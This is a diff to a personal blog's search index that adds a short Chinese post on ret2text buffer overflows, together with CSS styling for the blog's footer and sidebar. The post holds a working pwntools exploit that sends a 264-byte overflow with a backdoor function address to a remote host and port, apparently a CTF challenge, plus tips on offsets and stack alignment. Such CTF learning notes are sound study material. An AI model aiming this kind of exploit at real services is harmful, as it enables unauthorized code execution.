@@ -1,6 +1,15 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title></title>
+    <url>/posts/0.html</url>
+    <content><![CDATA[用gdb的动态视角看ret2text的实现from pwn import *io = remote(&quot;39.106.48.123&quot;, 29826)payload = b&quot;A&quot;*264 + p64(0x401202)io.sendline(payload)io.interactive()
+
+264即258+8，258是rbp的位置，ida里一般是16位，0x401202为后门函数入栈的地址
+注意：1.一定不要忘记加8个字节 2.如果不成功，可能是栈没有对齐，需要把后门函数的地址往后加两个单位
+]]></content>
+  </entry>
+  <entry>
     <title>梦开始的地方</title>
     <url>/posts/1234.html</url>
     <content><![CDATA[我的博客搭建终于好了！
@@ -389,6 +398,56 @@ div#category {
 /* 代码框主题 */
 #article-container figure.highlight {
   border-radius: 10px;
-}]]></content>
+}
+
+/* 鱼塘固定宽度 */
+canvas:not(#ribbon-canvas), /*#web_bg*/ {
+    margin-bottom: -0.5rem;
+    display: block;
+    width: 100%;
+    height: 160px
+}
+ 
+/* 鱼塘渐变色 */
+body{
+ overflow-x: hidden;
+}
+#footer {
+ height:160px;
+ background: linear-gradient(
+  135deg,
+  rgba(23, 23, 116, 0.2),
+  rgba(28, 181, 224, 0.2)
+ );
+}
+#footer #footer-wrap,
+#footer-wrap a {
+ color: #000;
+}
+#footer #footer-wrap {
+ z-index: 1;
+}
+ 
+#footer .container {
+ line-height: 0;
+ position: relative;
+ height: 100%;
+ width: 100vw;
+}
+ 
+/* 侧边栏个人信息卡片动态渐变色 */
+#aside-content>.card-widget.card-info{
+    background: linear-gradient(-45deg, rgba(255, 183, 197, 0.8), 
+    rgba(44, 227, 251, 0.8), 
+    rgba(255, 184, 226, 0.8), 
+    rgba(255, 219, 111, 0.8));
+}
+[data-theme=dark] #aside-content>.card-widget.card-info {
+    background: linear-gradient(-45deg, rgba(45, 45, 45, 0.8), 
+    rgba(60, 60, 60, 0.8), 
+    rgba(75, 75, 75, 0.8), 
+    rgba(90, 90, 90, 0.8));
+}
+]]></content>
   </entry>
 </search>
